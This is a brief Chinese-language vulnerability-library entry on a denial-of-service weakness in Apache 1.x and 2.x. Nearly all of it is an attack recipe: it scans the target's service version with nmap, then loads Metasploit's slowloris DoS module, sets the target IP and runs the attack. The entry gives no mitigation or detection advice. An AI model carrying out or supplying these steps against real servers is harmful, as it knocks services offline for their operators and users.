---
title: 'Apache拒绝服务漏洞'
date: Mon, 21 Sep 2020 17:17:03 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

Apache 1.x/2.x

### 漏洞利用

nmap使用-sV扫描服务器获取服务版本 msf利用步骤如下```
1.msfconsole(启动metasploit)

2.use auxiliary/dos/http/slowloris(使用模块)

3.set RHOST targetip(设置目标IP)

4.run(执行攻击) 
